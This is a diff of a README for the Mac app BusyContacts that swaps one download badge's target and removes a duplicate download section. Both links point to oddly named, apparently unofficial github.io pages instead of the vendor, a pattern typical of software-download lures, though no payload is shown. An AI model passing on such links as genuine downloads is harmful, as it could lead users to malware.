@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get BusyContacts Mac](https://img.shields.io/badge/Get_BusyContacts_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/busycontacts)
+[![Get BusyContacts Mac](https://img.shields.io/badge/Get_BusyContacts_for_Mac-blue?style=for-the-badge&logo=apple)](https://osx-app.github.io/.github/busycontacts)
 
 </div>
 
@@ -64,16 +64,6 @@ Highlights:
 ---
 
 ![BusyContacts List View](https://mikevardy.com/wp-content/uploads/2022/06/bct-list-view-1280.png)
-
----
-
-## Get BusyContacts Mac  
-
-<div align="center">
-
-[![Get BusyContacts Mac](https://img.shields.io/badge/Get_BusyContacts_for_Mac-blue?style=for-the-badge&logo=apple)](https://jumakas-olftol-mang.github.io/.github/busycontacts)
-
-</div>
 
 ---
 
